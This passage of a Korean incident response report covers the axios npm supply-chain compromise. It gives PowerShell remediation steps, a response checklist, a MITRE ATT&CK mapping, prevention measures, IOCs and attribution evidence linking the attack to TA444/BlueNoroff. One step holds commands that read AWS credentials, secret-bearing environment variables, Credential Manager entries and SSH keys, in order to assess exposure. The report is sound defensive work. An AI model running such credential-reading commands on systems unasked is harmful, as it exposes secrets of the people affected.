Get-Process | Where-Object { $_.Path -like "*ProgramData*" }
Get-Process -Name "wt" -ErrorAction SilentlyContinue

# 강제 종료
Stop-Process -Name "wt" -Force
taskkill /F /IM wt.exe
```

#### Step 2. RAT 바이너리 및 persistence 제거

```powershell
# 메인 아티팩트 삭제
Remove-Item "$env:PROGRAMDATA\wt.exe" -Force -ErrorAction SilentlyContinue

# 숨겨진 .bat 파일 탐색
Get-ChildItem "$env:PROGRAMDATA" -Force -Filter "*.bat"
Get-ChildItem "$env:TEMP" -Force

# Registry Run 키 확인 및 제거 (핵심 — Windows persistence)
# HKCU
Get-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
# HKLM (관리자 권한 필요)
Get-ItemProperty "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run"
Get-ItemProperty "HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce"

# 의심 항목 삭제
Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" `
  -Name "<suspicious_entry>" -ErrorAction SilentlyContinue
```

#### Step 3. 2단계 Persistence 전수 조사

```powershell
# 예약 작업 (Scheduled Tasks)
Get-ScheduledTask | Where-Object { $_.State -eq "Ready" } | 
  Select-Object TaskName, TaskPath | Format-Table

# 서비스 확인
Get-Service | Where-Object { $_.StartType -eq "Automatic" } | 
  Where-Object { $_.Status -eq "Running" }

# 시작 프로그램 (Startup 폴더)
Get-ChildItem "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
Get-ChildItem "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"

# WMI 구독 (은폐 persistence 수단)
Get-WMIObject -Namespace root\subscription -Class __EventFilter
Get-WMIObject -Namespace root\subscription -Class __EventConsumer
```

#### Step 4. 탈취 가능 자격증명 확인

```powershell
# AWS
Get-Content "$env:USERPROFILE\.aws\credentials" -ErrorAction SilentlyContinue

# 환경변수
[System.Environment]::GetEnvironmentVariables() | 
  Where-Object { $_.Key -match "token|key|secret|pass" }

# Windows Credential Manager
cmdkey /list

# SSH 키
Get-ChildItem "$env:USERPROFILE\.ssh\"
```

#### Step 5. 메모리 인젝션 흔적 확인

Windows 버전 RAT은 `Extension.SubRoutine.Run2`를 통해 DLL을 메모리에 로드한다.

```powershell
# 의심 프로세스의 메모리 모듈 확인
Get-Process | ForEach-Object {
  try {
    $_.Modules | Where-Object { $_.FileName -notlike "C:\Windows\*" }
  } catch {}
} | Select-Object FileName | Sort-Object -Unique

# PowerShell 인코딩 명령 실행 이력 확인
Get-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational" |
  Where-Object { $_.Message -match "EncodedCommand|base64" } |
  Select-Object TimeCreated, Message | Format-List
```

---

### 7.5 대응 완료 체크리스트

감염 대응이 완료되었다고 판단하기 전에 아래를 모두 확인한다.

```
[ ] C2 도메인/IP 네트워크 차단 완료 (sfrclak.com, 142.11.206.73)
[ ] RAT 프로세스 종료 완료
[ ] RAT 바이너리 삭제 완료
[ ] 2단계 Persistence 항목 전수 조사 및 제거 완료
[ ] plain-crypto-js 디렉터리 제거 완료
[ ] axios 안전 버전(1.14.0 / 0.30.3)으로 교체 완료
[ ] 모든 자격증명 로테이션 완료
    [ ] SSH 키
    [ ] AWS / GCP / Azure
    [ ] GitHub / GitLab Token
    [ ] npm Token
    [ ] .env 파일 내 시크릿
    [ ] Kubernetes config
[ ] 다운스트림 시스템 (탈취 자격증명으로 접근 가능했던 서버) 감사 완료
[ ] CI/CD 파이프라인 노출 시간대 빌드 재검토 완료
[ ] 포렌식 증거 보존 완료 (필요 시)
[ ] 재감염 방지 조치 완료 (--ignore-scripts, 버전 고정, lockfile 커밋)
```

---

## 8. MITRE ATT&CK 매핑 (Hunt.io 기반)

| Technique | Name | 적용 |
|---|---|---|
| T1195.002 | Supply Chain Compromise | npm 메인테이너 계정 침해 |
| T1059.001 | PowerShell | Windows RAT, `-ep bypass` |
| T1059.002 | AppleScript | macOS RAT, osascript |
| T1059.006 | Python | Linux RAT, python3 -c |
| T1547.001 | Registry Run Keys | `HKCU\...\Run\MicrosoftUpdate` |
| T1553.002 | Code Signing (Subvert Trust Controls) | `codesign --force --deep --sign -` (Gatekeeper 우회) |
| T1055 | Process Injection | .NET Reflection → cmd.exe |
| T1082 | System Info Discovery | 호스트명, OS, CPU, 타임존 |
| T1057 | Process Discovery | WMI / /proc 순회 / ps -eo |
| T1071.001 | HTTP Protocol | C2 POST beacon, 포트 8000 |
| T1036.005 | Masquerading | `MicrosoftUpdate`, `com.apple.act.mond`, `wt.exe` |
| T1027 | Obfuscated Files | XOR + Reversed Base64 |
| T1070.004 | File Deletion | setup.js 자체 삭제 + 임시 파일 정리 |

---

## 9. 예방 조치

### 단기 (즉시 적용 가능)

```bash
# npm postinstall 스크립트 비활성화 (CI 환경)
npm ci --ignore-scripts

# 버전 고정
npm install axios@1.14.0 --save-exact

# C2 블랙홀
echo "0.0.0.0 sfrclak.com" | sudo tee -a /etc/hosts
echo "0.0.0.0 callnrwise.com" | sudo tee -a /etc/hosts

# npm 최소 게시 후 경과 시간 설정 (3일 미만 패키지 차단 — 이번 공격 차단 가능)
npm config set min-release-age 3
```

### 중기

- `package-lock.json` / `yarn.lock` 커밋 의무화 및 CI에서 `npm ci` 사용
- Lockfile 변경 시 diff 리뷰 프로세스 추가
- SLSA provenance가 없는 패키지 설치 시 경보 (이번 공격의 가장 명확한 사전 신호)
- CI/CD 파이프라인에서 outbound 네트워크 허용 도메인 allowlist 적용 (npm registry 외 차단)
- `plain-crypto-js`를 패키지 매니저 블랙리스트에 추가
- npm overrides로 semver drift 방지:

```json
{
  "overrides": { "axios": "1.14.0" },
  "resolutions": { "axios": "1.14.0" }
}
```

### 장기

- 공급망 보안 도구 도입 (Snyk, Socket, StepSecurity Harden-Runner 등)
- npm trusted publishing (OIDC) + SLSA provenance 검증 파이프라인 구축
- 사용 중인 npm 패키지의 maintainer 변경 알림 구독
- `phantom dependency` 탐지 — `package.json`에 있으나 코드에서 `require()/import` 되지 않는 패키지 자동 경보

---

## 9. 귀속 분석 (v1.1 업데이트 — Hunt.io 근거 반영)

**귀속 대상:** TA444 / BlueNoroff (DPRK 연계, Lazarus 하위 그룹)

Hunt.io가 단일 지표가 아닌 8가지 독립적 증거 레이어를 기반으로 TA444/BlueNoroff를 귀속했다. Google GTIG는 동일 그룹을 UNC1069로 추적한다.

### 9.1 귀속 근거 상세

**① 인프라 ETag 공유 (신뢰도: 높음)**

C2 서버 `142.11.206.73`이 Hunt.io가 기존에 추적하던 TA444/BlueNoroff 인프라 서버 `23.254.167.216`과 동일한 HTTP ETag 헤더를 공유한다. ETag는 웹서버가 파일 내용/수정 시간 기반으로 생성하므로, 서로 다른 두 서버가 동일 ETag를 가진다는 것은 동일 공격자가 동일 배포 파이프라인으로 운영 중임을 강하게 시사한다.

**② Hostwinds AS54290 / 142.11.192.0/18 서브넷 (신뢰도: 높음)**

C2 IP가 위치한 `/18` 서브넷(`142.11.192.0/18`)에는 이전 수사에서 Lazarus 인프라로 확인된 IP가 최소 3개 이상 포함되어 있다. Hostwinds는 Hunt.io 추적 기준 TA444/BlueNoroff가 가장 자주 사용하는 호스팅 제공사다 (암호화폐 결제, 최소 신원 확인).

**③ JustJoin 캠페인 연결 (신뢰도: 높음)**

ETag를 공유하는 `23.254.167.216`은 Zoom 미팅 모니터링을 위장한 가짜 macOS 앱 "JustJoin" 랜딩 페이지를 호스팅 중이었다. SentinelOne이 이를 BlueNoroff의 개발자/암호화폐 종사자 타겟팅 캠페인과 연결한 바 있다.

**④ NukeSped 악성코드 분류 (신뢰도: 높음)**

macOS Mach-O 바이너리가 Lazarus 그룹에만 귀속되는 악성코드 패밀리 **NukeSped**로 분류되었다. 바이너리 내부 명명 규칙이 `macWebT`를 참조하며, 이는 SentinelOne 2023년 TA444/BlueNoroff macOS 캠페인 보고서에 기록된 것과 일치한다.

**⑤ SSH 키 지문 클러스터 (신뢰도: 높음)**

JustJoin 서버와 연결된 추가 서버 2개(`108.174.194.44`, `108.174.194.196`)가 동일한 SSH 키 지문(`e1f6b7f621...40289f`)을 공유한다. 이는 동일 공격자가 3개 서버를 조율 관리함을 의미한다. `108.174.194.196`은 이메일 서비스 포트(143, 993, 995)가 열려 있어 피싱 인프라로 추정된다.

**⑥ WAVESHAPER 코드 오버랩 (신뢰도: 높음)**

Elastic Security Labs가 macOS Mach-O 바이너리에서 Mandiant 추적 **WAVESHAPER** 백도어(UNC1069 귀속)와 코드 오버랩을 확인했다.

**⑦ TTP 정렬 (신뢰도: 중-높음)**

TA444/BlueNoroff는 최소 2023년부터 npm/PyPI 공급망 공격 패턴을 사용해왔고, macOS에 특히 집중된 크로스플랫폼 툴킷을 지속적으로 구축해왔다. 개발자 머신 타겟팅(암호화폐 지갑, 클라우드 자격증명, 서명 키)이 주요 목적이며 이는 DPRK 정권의 재정 탈취 임무와 일치한다.

**⑧ Proton Mail 계정 패턴 (신뢰도: 낮음, 단독으로는 불충분)**

침해된 npm 계정에 사용된 이메일(`ifstap@proton.me`, `nrwise@proton.me`)이 모두 Proton Mail 익명 주소다. DPRK 연계 공격자들이 인프라 등록에 Proton Mail을 반복적으로 사용한다는 패턴과 일치한다.

### 9.2 귀속 신뢰도 요약

| 증거 | 구체적 지표 | 신뢰도 |
|---|---|---|
| 공유 ETag | Axios C2 ↔ 23.254.167.216 (확인된 DPRK JustJoin 서버) | **HIGH** |
| ASN + 서브넷 | Hostwinds AS54290, 동일 /18 서브넷에 확인된 Lazarus IP 3개 이상 | **HIGH** |
| JustJoin 캠페인 | ETag 연결 서버가 TA444/BlueNoroff macOS 루어 페이지 호스팅 | **HIGH** |
| NukeSped 분류 | macOS 바이너리가 Lazarus 전용 악성코드 패밀리로 분류 | **HIGH** |
| SSH 키 클러스터 | 3개 서버가 지문 `e1f6b7f6...` 공유 | **HIGH** |
| WAVESHAPER | Elastic이 WAVESHAPER/UNC1069 코드 오버랩 확인 | **HIGH** |
| TTP 정렬 | npm 공급망 공격, macOS 집중, 개발자 타겟 패턴 | **MEDIUM-HIGH** |
| Proton Mail | npm 계정 이메일이 Proton Mail 익명 주소 | **LOW (단독 시)** |

### 9.3 연관 DPRK 인프라

| 유형 | 지표 | 맥락 |
|---|---|---|
| IP | `23.254.167[.]216` | Axios C2와 ETag 공유, JustJoin 랜딩 페이지 호스팅 |
| IP | `108.174.194[.]44` | JustJoin 서버와 SSH 키 공유, 현재 활성 |
| IP | `108.174.194[.]196` | SSH 키 공유, 이메일 포트 143/993/995 (피싱 인프라) |
| 도메인 | `a0info.v6[.]army` | JustJoin 랜딩 페이지, NameCheap 등록 |
| SSH 지문 | `e1f6b7f621a391a9d26e9a196974f3e2cc1ce8b4d8f73a14b2e8cb0f2a40289f` | 3개 조율 관리 서버 공유 |

### 9.4 캠페인 연관성 (TeamPCP)

SANS는 이번 공격이 **TeamPCP** 캠페인의 연장선일 가능성을 제기했다. 2026년 3월 19~27일 사이 Trivy(취약점 스캐너), KICS(IaC 스캐너), LiteLLM(PyPI), Telnyx(PyPI) 등 4개 오픈소스 프로젝트가 동일 패턴으로 침해됐으며, 각 공격에서 클라우드 자격증명, SSH 키, Kubernetes 설정 파일, CI/CD 시크릿이 탈취됐다.

**신뢰도:** 전체적으로 높음. 단일 지표가 아닌 6개 HIGH 신뢰도 증거의 수렴에 기반하며, 완전한 공개 방법론은 Hunt.io, Elastic, Mandiant 원문을 참조해야 한다.

---

## 10. 분석 소스 및 Gap

### 수집된 주요 분석 소스

| 기관 | 고유 기여 |
|---|---|
| **Elastic Security Labs** | 드로퍼 완전 기술 분석, XOR 공식(`7*i²%10`), 플랫폼별 실행 체인, WAVESHAPER 코드 오버랩, behavioral detection rule |
| **Hunt.io** | IDA Pro 기반 macOS Mach-O 완전 역공학, Linux peinject 버그 발견, TA444/BlueNoroff 귀속 (ETag 공유, NukeSped, SSH 키 클러스터), C2 명령/응답/상태코드 전체 문서화 |
| **Endor Labs** | SHA-256 전체 해시, AV 탐지율, callnrwise.com 이중화 C2 발견, C2 도메인 등록 타임스탬프, tarball 바이트 크기 비교, Windows 첫 beacon 탈취 데이터 상세, CLR 사용 로그 아티팩트 |
| **StepSecurity** | 레지스트리 타임라인, package.json 스왑 후 `npm ls` 기만 세부, 런타임 실증 (1.1초 내 C2 콜백) |
| **Socket** | stq[] 18개 문자열 정적 복원 |
| **SafeDep** | C2 Express.js 확인, IP 해석, Linux RAT persistence 없음 명시 |
| **OX Security** | Windows PowerShell 변종 세부 분석 |
| **Snyk** | 실무 대응 가이드 |
| **SANS Institute** | TeamPCP 캠페인 연관성 |
| **BleepingComputer** | OIDC/provenance 부재 신호, 생태계 영향 |
| **Nextgov / Google GTIG** | UNC1069 공식 귀속 |

### 분석 Gap (미수집 또는 미확인)

- Sophos CTU 분석의 고유 내용 미수집
- 피해 범위 확정 (Wiz 3% 추정은 스캔 환경 기준)
- 메인테이너 계정 침해 초기 벡터 미확인 (GitHub 계정 침해 경위 불명)
- macOS universal binary (x86_64+arm64) 여부 — Endor Labs는 universal binary로 명시, Hunt.io는 단일 아키텍처로 분석했으나 교차 검증 필요

---

## Appendix — 빠른 참조

### 악성 버전 즉시 확인

```bash
# 하나의 명령으로 감염 여부 1차 확인
node -e "const a=require('./node_modules/axios/package.json'); \
  const p=require('./node_modules/plain-crypto-js/package.json'); \
  console.log('axios:',a.version,'plain-crypto-js:',p.version)"
# plain-crypto-js 패키지 자체가 존재하면 이미 dropper 실행된 것
```

### 안전한 axios 버전 사용

```bash
npm install axios@1.14.0 --save-exact
# 또는
npm install axios@0.30.3 --save-exact
```

### 참고 링크

- Hunt.io (TA444/BlueNoroff 귀속, IDA Pro 분석): https://hunt.io/blog/axios-supply-chain-attack-ta444-bluenoroff
- Endor Labs (전체 해시, callnrwise.com, 런타임 검증): https://www.endorlabs.com/learn/npm-axios-compromise
- Elastic Security Labs 기술 분석: https://www.elastic.co/security-labs/axios-one-rat-to-rule-them-all
- Elastic IOC/Detection: https://www.elastic.co/security-labs/axios-supply-chain-compromise-detections
- StepSecurity: https://www.stepsecurity.io/blog/axios-compromised-on-npm-malicious-versions-drop-remote-access-trojan
- Socket: https://socket.dev/blog/axios-npm-package-compromised
- SafeDep: https://safedep.io/axios-npm-supply-chain-compromise
- Snyk: https://snyk.io/blog/axios-npm-package-compromised-supply-chain-attack-delivers-cross-platform/
- The Hacker News: https://thehackernews.com/2026/03/axios-supply-chain-attack-pushes-cross.html
- SANS: https://www.sans.org/blog/axios-npm-supply-chain-compromise-malicious-packages-remote-access-trojan

---

*본 보고서는 공개 출처(OSINT) 기반으로 작성되었으며, v1.1에서 Hunt.io(IDA Pro 역공학, TA444/BlueNoroff 귀속) 및 Endor Labs(전체 해시, 이중화 C2, AV 탐지율)의 내용을 추가 반영했다. 인용된 기술 세부 사항은 여러 독립 분석 기관의 교차 검증을 통해 신뢰도를 확인했으나, 원문 출처를 직접 참조할 것을 권장한다.*
